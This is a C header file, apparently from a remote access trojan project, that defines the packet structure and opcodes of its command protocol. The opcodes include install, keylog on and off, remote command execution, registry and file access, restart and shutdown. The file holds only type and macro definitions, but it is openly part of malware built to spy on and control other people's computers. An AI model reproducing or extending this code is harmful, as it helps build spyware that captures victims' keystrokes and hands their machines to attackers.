#pragma once

#include <stdint.h>

#define RAT_OPCODE_MAX_LEN 3 // max is 255 which is 3 bytes
#define DEFAULT_BUFLEN 64
#define DEFAULT_KEYLOG_BUFLEN 256

#define RAT_DATA_SIZE (DEFAULT_BUFLEN - sizeof(ratpacket_t))
#define RAT_KEYLOG_DATA_SIZE (DEFAULT_KEYLOG_BUFLEN - sizeof(ratpacket_t))

#define FOREACH_RAT_OPCODE                                                     \
  _(ECHO, 0, "Echo")                                                           \
  _(INSTALL, 1, "Install")                                                     \
  _(UNINSTALL, 2, "Uninstall")                                                 \
  _(DISCONNECT, 3, "Disconnect")                                               \
  _(KEYLOG, 4, "Keylog")                                                       \
  _(TURN_OFF, 5, "Keylog_off")                                                 \
  _(TURN_ON, 6, "Keylog_on")                                                   \
  _(RESTART, 7, "Restart")                                                     \
  _(SHUTDOWN, 8, "Shutdown")                                                   \
  _(FILE, 9, "File")                                                           \
  _(REGISTRY, 10, "Registry")                                                  \
  _(CMD, 11, "Cmd")                                                            \
  _(ALERT, 12, "Alert")

typedef enum {
#define _(s, v, n) RAT_PACKET_##s = (v),
  FOREACH_RAT_OPCODE
#undef _
} op_codes;

char *rat_opcode_to_str(op_codes op);

typedef struct __attribute__((packed)) {
  uint8_t op;
  uint64_t data_len;
  uint8_t data[];
} ratpacket_t;

typedef struct {
  char *name;
  uint64_t content_len;
  uint8_t *content;
} entry_t;

typedef struct {
  char title[15];
  char text[35];
  int amount;
} alert_t;